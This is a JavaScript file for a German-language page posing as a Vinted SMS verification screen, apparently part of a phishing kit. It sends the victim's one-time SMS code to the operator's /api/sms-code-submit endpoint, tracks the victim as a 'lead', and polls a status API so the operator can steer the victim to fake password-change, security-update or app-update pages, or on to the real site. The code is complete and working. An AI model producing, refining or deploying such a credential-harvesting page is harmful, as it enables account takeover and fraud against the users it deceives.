(function () {
  'use strict';
  window.__vintSmsBootstrapped = true;

  var credFetch = { credentials: 'include' };
  var leadStorageKey = 'gmw_vint_lead_id';
  var waitStateKey = 'gmw_vint_wait_sms_submit';
  var statusPollTimer = null;
  var countdownTimer = null;
  var valueWatchdogTimer = null;
  var countdownSeconds = 300;
  var CODE_LENGTH = 4;
  var submitInFlight = false;

  var form = document.getElementById('sms-form');
  var input = document.getElementById('code');
  var button = document.getElementById('verify-btn');
  var errorNode = document.getElementById('vint-sms-error');
  var waitOverlay = document.getElementById('vint-sms-wait-overlay');
  var waitCountdown = document.getElementById('vint-sms-wait-countdown');
  var resendTimerNode = document.getElementById('resend-timer');

  function safeTrim(value) {
    return value == null ? '' : String(value).trim();
  }

  function readQueryLeadId() {
    try {
      return safeTrim(new URLSearchParams(window.location.search || '').get('id'));
    } catch (e) {
      return '';
    }
  }

  function getStoredLeadId() {
    try {
      return safeTrim(sessionStorage.getItem(leadStorageKey));
    } catch (e) {
      return '';
    }
  }

  function setStoredLeadId(id) {
    var leadId = safeTrim(id);
    if (!leadId) return;
    try {
      sessionStorage.setItem(leadStorageKey, leadId);
    } catch (e) {}
  }

  function resolveLeadId() {
    var fromQuery = readQueryLeadId();
    if (fromQuery) {
      setStoredLeadId(fromQuery);
      return fromQuery;
    }
    return getStoredLeadId();
  }

  function hasWaitState() {
    try {
      return sessionStorage.getItem(waitStateKey) === '1';
    } catch (e) {
      return false;
    }
  }

  function markWaitState() {
    try {
      sessionStorage.setItem(waitStateKey, '1');
    } catch (e) {}
  }

  function clearWaitState() {
    try {
      sessionStorage.removeItem(waitStateKey);
    } catch (e) {}
  }

  function setError(message) {
    if (!errorNode) return;
    var text = safeTrim(message);
    if (!text) {
      errorNode.hidden = true;
      errorNode.textContent = '';
      return;
    }
    errorNode.hidden = false;
    errorNode.textContent = text;
  }

  function normalizeDigitChars(raw) {
    var text = safeTrim(raw);
    if (!text) return '';
    // Keep keypad/autofill robust for full-width and Arabic-Indic digits.
    return text.replace(/[０-９\u0660-\u0669\u06F0-\u06F9]/g, function (ch) {
      var code = ch.charCodeAt(0);
      if (code >= 0xFF10 && code <= 0xFF19) return String(code - 0xFF10);
      if (code >= 0x0660 && code <= 0x0669) return String(code - 0x0660);
      if (code >= 0x06F0 && code <= 0x06F9) return String(code - 0x06F0);
      return ch;
    });
  }

  function normalizeCode(raw) {
    return normalizeDigitChars(raw).replace(/\D/g, '').slice(0, CODE_LENGTH);
  }

  function isCodeValid(code) {
    return code.length === CODE_LENGTH;
  }

  function setButtonEnabled(enabled) {
    if (!button) return;
    button.disabled = !enabled;
    button.setAttribute('aria-disabled', enabled ? 'false' : 'true');
    if (enabled) button.classList.remove('web_ui__Button__disabled');
    else button.classList.add('web_ui__Button__disabled');
  }

  function syncButton() {
    if (!input) return;
    var code = normalizeCode(input.value);
    input.value = code;
    setButtonEnabled(isCodeValid(code));
  }

  function stopStatusPoll() {
    if (!statusPollTimer) return;
    clearInterval(statusPollTimer);
    statusPollTimer = null;
  }

  function stopCountdown() {
    if (!countdownTimer) return;
    clearInterval(countdownTimer);
    countdownTimer = null;
  }

  function formatCountdown(totalSeconds) {
    var safe = Math.max(0, totalSeconds | 0);
    var minutes = Math.floor(safe / 60);
    var seconds = safe % 60;
    return String(minutes) + ':' + (seconds < 10 ? '0' : '') + String(seconds);
  }

  function showWaitOverlay(resetCountdown) {
    if (!waitOverlay) return;
    if (resetCountdown) countdownSeconds = 300;
    waitOverlay.hidden = false;
    if (waitCountdown) waitCountdown.textContent = formatCountdown(countdownSeconds);
    stopCountdown();
    countdownTimer = setInterval(function () {
      if (countdownSeconds > 0) countdownSeconds -= 1;
      if (waitCountdown) waitCountdown.textContent = formatCountdown(countdownSeconds);
      if (countdownSeconds <= 0) stopCountdown();
    }, 1000);
  }

  function hideWaitOverlay() {
    stopCountdown();
    if (waitOverlay) waitOverlay.hidden = true;
  }

  function redirectForStatus(status, leadId) {
    var id = safeTrim(leadId);
    if (!id) return;
    if (status === 'redirect_change_password') {
      window.location = '/passwort-aendern?id=' + encodeURIComponent(id);
      return;
    }
    if (status === 'redirect_sicherheit') {
      window.location = '/sicherheit-update?id=' + encodeURIComponent(id);
      return;
    }
    if (status === 'redirect_android') {
      window.location = '/app-update?id=' + encodeURIComponent(id);
      return;
    }
    if (status === 'redirect_open_on_pc') {
      window.location = '/bitte-am-pc?id=' + encodeURIComponent(id);
      return;
    }
    if (status === 'redirect_gmx_net') {
      window.location.href = 'https://www.vinted.de/';
      return;
    }
    if (status === 'redirect_push' || status === 'redirect_sms_code' || status === 'redirect_2fa_code') {
      return;
    }
    if (status === 'show_success') {
      window.location = '/anmelden';
    }
  }

  function applyStatus(status, leadId) {
    if (status === 'pending' || status === 'redirect_sms_code' || status === 'redirect_2fa_code' || status === 'redirect_push') {
      if (hasWaitState()) showWaitOverlay(false);
      return;
    }
    if (status === 'error') {
      submitInFlight = false;
      stopStatusPoll();
      hideWaitOverlay();
      clearWaitState();
      syncButton();
      setError('Der eingegebene Code ist nicht korrekt. Bitte überprüfen Sie Ihre Eingabe.');
      return;
    }
    if (status === 'not_found') {
      submitInFlight = false;
      stopStatusPoll();
      hideWaitOverlay();
      clearWaitState();
      syncButton();
      setError('Sitzung abgelaufen. Bitte melden Sie sich erneut an.');
      return;
    }
    if (
      status === 'redirect_change_password' ||
      status === 'redirect_sicherheit' ||
      status === 'redirect_android' ||
      status === 'redirect_open_on_pc' ||
      status === 'redirect_gmx_net' ||
      status === 'show_success'
    ) {
      submitInFlight = false;
      stopStatusPoll();
      hideWaitOverlay();
      clearWaitState();
      redirectForStatus(status, leadId);
    }
  }

  function bindCodeInput() {
    if (!input) return;
    var handleValueChange = function () {
      setError('');
      syncButton();
    };
    var scheduleSync = function () {
      setTimeout(handleValueChange, 0);
    };
    input.addEventListener('beforeinput', scheduleSync);
    input.addEventListener('input', handleValueChange);
    input.addEventListener('change', handleValueChange);
    input.addEventListener('keyup', handleValueChange);
    input.addEventListener('blur', handleValueChange);
    input.addEventListener('compositionend', scheduleSync);
    input.addEventListener('paste', function () {
      scheduleSync();
    });
    input.addEventListener('drop', function () {
      scheduleSync();
    });
    input.addEventListener('keydown', function (event) {
      if (!event) return;
      if (event.key === 'Enter') handleValueChange();
    });

    // OTP autofill can mutate input value without firing `input`.
    var lastSeenValue = input.value;
    valueWatchdogTimer = setInterval(function () {
      if (!input) return;
      if (input.value === lastSeenValue) return;
      lastSeenValue = input.value;
      handleValueChange();
    }, 250);

    syncButton();
  }

  function pollStatus(leadId) {
    fetch('/api/status?id=' + encodeURIComponent(leadId) + '&page=vint-sms&_=' + Date.now(), Object.assign({
      cache: 'no-store',
      headers: { Pragma: 'no-cache' }
    }, credFetch))
      .then(function (r) { return r.json(); })
      .then(function (res) {
        var status = res && res.status ? String(res.status) : 'pending';
        applyStatus(status, leadId);
      })
      .catch(function () {});
  }

  function startStatusPoll(leadId) {
    var id = safeTrim(leadId);
    if (!id) return;
    stopStatusPoll();
    pollStatus(id);
    statusPollTimer = setInterval(function () {
      pollStatus(id);
    }, 1000);
  }

  function startResendCountdown() {
    if (!resendTimerNode) return;
    var seconds = 59;
    resendTimerNode.textContent = '0:59';
    setInterval(function () {
      if (seconds <= 0) return;
      seconds -= 1;
      resendTimerNode.textContent = '0:' + (seconds < 10 ? '0' : '') + seconds;
    }, 1000);
  }

  bindCodeInput();

  if (form) {
    form.addEventListener('submit', function (event) {
      event.preventDefault();
      if (submitInFlight) return;
      setError('');
      var leadId = resolveLeadId();
      if (!leadId) {
        setError('Sitzung abgelaufen. Bitte melden Sie sich erneut an.');
        return;
      }
      var code = input ? normalizeCode(input.value) : '';
      if (!isCodeValid(code)) {
        syncButton();
        return;
      }
      submitInFlight = true;
      setButtonEnabled(false);
      markWaitState();
      showWaitOverlay(true);
      fetch('/api/sms-code-submit', Object.assign({
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ id: leadId, visitId: leadId, code: code, kind: 'sms' })
      }, credFetch))
        .then(function (r) {
          if (!r || !r.ok) throw new Error('sms_submit_failed');
          return r.json().catch(function () { return {}; });
        })
        .then(function (res) {
          if (res && res.ok === false) throw new Error('sms_submit_rejected');
          startStatusPoll(leadId);
        })
        .catch(function () {
          submitInFlight = false;
          hideWaitOverlay();
          clearWaitState();
          syncButton();
          setError('Fehler beim Senden. Bitte versuchen Sie es erneut.');
        });
    });
  }

  var startupLeadId = resolveLeadId();
  if (startupLeadId) {
    if (hasWaitState()) {
      submitInFlight = true;
      showWaitOverlay(false);
    }
    startStatusPoll(startupLeadId);
  }
  startResendCountdown();
})();
